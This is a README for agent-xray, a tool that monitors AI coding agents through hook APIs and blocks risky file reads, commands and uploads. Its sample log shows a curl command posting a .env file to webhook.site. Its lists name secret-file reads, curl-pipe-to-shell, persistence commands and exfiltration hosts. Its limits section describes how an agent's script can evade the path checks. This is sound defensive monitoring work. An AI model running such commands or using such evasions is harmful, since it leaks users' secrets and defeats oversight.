# agent-xray

**X-ray for AI coding agents.** See which files your agent reads, which commands it runs and where your data goes, in real time. Dangerous actions are blocked.

```
18:26:16  ✔ ok     file:read  ~/projects/shop/src/index.ts
18:26:19  ⚠ WARN   file:read  ~/projects/shop/.env            ← sensitive path (**/.env)
18:26:22  ✖ BLOCK  file:read  ~/.ssh/id_rsa                    ← sensitive path (**/.ssh/**)
18:26:23  ✖ BLOCK  exec       curl -X POST -d @.env https://webhook.site/…  ← uploads a secret file
```

> Status: **v0.3** — multi-agent: Claude Code, ZCode and Cursor via their hook APIs; local web dashboard with a 3D "universe" view. Zero runtime dependencies. Node 18+.

## Agents

`agent-xray agents` lists what is installed on this machine and what is supported:

| Agent | Status |
|---|---|
| Claude Code | ✔ full support (`PreToolUse` hook in `~/.claude/settings.json`) |
| ZCode | ✔ full support (`PreToolUse` in `~/.zcode/cli/config.json`, needs a ZCode restart) |
| Cursor | ✔ beta (`beforeShellExecution` + `beforeReadFile` in `~/.cursor/hooks.json`) |
| Codex CLI, Gemini CLI, OpenCode, Windsurf, Aider | detected, but they have no hook API yet — the local proxy mode (roadmap) will cover them |

```bash
node dist/cli.js install        # every supported agent found on this machine
node dist/cli.js install zcode  # just one: claude | zcode | cursor | project
node dist/cli.js uninstall      # removes only our hooks (backups are kept)
```

## Quick start

```bash
git clone <this repo> && cd agent-xray
node dist/cli.js install        # hooks for every supported agent (backups are kept)
node dist/cli.js dashboard      # web dashboard on http://127.0.0.1:8787 (opens the browser)
node dist/cli.js watch          # or: live feed in the terminal
# restart your agent(s) and use them as usual
node dist/cli.js report         # summary + risk grade
node dist/cli.js uninstall      # removes only our hooks
```

Try it without any agent: `node dist/cli.js demo` (add `--log` to also feed the event log, e.g. before opening the dashboard).

Use `--project` with `install`/`uninstall` to write to `./.claude/settings.local.json` instead of your global settings.

## What the levels mean

| Level | Effect in Claude Code |
|-------|-----------------------|
| `✔ ok` | allowed silently (still logged) |
| `⚠ WARN` | Claude Code **asks you** before running it |
| `✖ BLOCK` | tool call is **denied** and Claude is told why |

## What it watches

- **Files** (Read, Edit, Write, MultiEdit, NotebookEdit, Grep, Glob): `.env*`, `~/.ssh`, cloud credentials, keys, wallets, browser password stores, shell rc files, CI workflows, the agent's own `settings.json`. Symlinks are resolved.
- **Commands** (Bash): `curl | sh`, `rm -rf /`, env dumps, uploading secret files, `sudo`, force-push, package publish, persistence (`crontab`, `launchctl`) … Paths inside commands are checked too (`cat .env`, `cp ~/.ssh/id_rsa …`).
- **Network** (WebFetch + URLs in Bash): hosts are logged; known exfiltration endpoints (webhook.site, pastebin, ngrok, interactsh …) and data uploads to unlisted hosts are flagged.

Secrets are never written to the log: commands are redacted, file *contents* are never read.

## Custom rules

`~/.agent-xray/rules.json` — arrays are appended to the built-ins, `allow` wins over `block`/`warn`:

```json
{
  "file":    { "allow": ["~/work/**/.env"], "warn": ["~/Documents/taxes/**"] },
  "network": { "allow": ["internal.mycompany.com"] },
  "command": { "warn": [{ "pattern": "\\bterraform\\s+apply\\b", "reason": "infra change" }] }
}
```

## Honest limits (read this)

agent-xray is a **guardrail and a window, not a sandbox.**

- It sees what goes through Claude Code's tool calls. An agent that runs a script which itself opens files or sockets (`python -c "open('.e'+'nv')"`) can slip past path checks.
- Grep/Glob over a whole directory can't tell which files inside it get read.
- Hooks fail **open**: if agent-xray crashes, your agent keeps working (errors go to `~/.agent-xray/errors.log`).
- Managed/enterprise setups using `allowManagedHooksOnly` will not run user hooks.
- Only Claude Code is supported today. Network proxy mode and other agents are on the roadmap.

## Web dashboard

`agent-xray dashboard` serves a dark live dashboard on `http://127.0.0.1:8787` (bound to localhost only, `--port` to change):

- live event feed (server-sent events — no refresh needed);
- risk grade and counters for the selected session;
- filters: all / warned / blocked, plus a session switcher;
- nothing ever leaves your machine.

## Roadmap

- [ ] Local HTTP(S) proxy (domain-level network visibility for any agent)
- [x] Web dashboard on localhost
- [ ] README badge + shareable session report
- [ ] OS-level strict mode (eBPF / seccomp on Linux)
- [x] Claude Code + ZCode + Cursor (hook APIs); proxy mode for the rest

## Development

```bash
npm install
npm test        # compiles, then runs 13 tests incl. real hook-process and dashboard tests
```

MIT licensed.
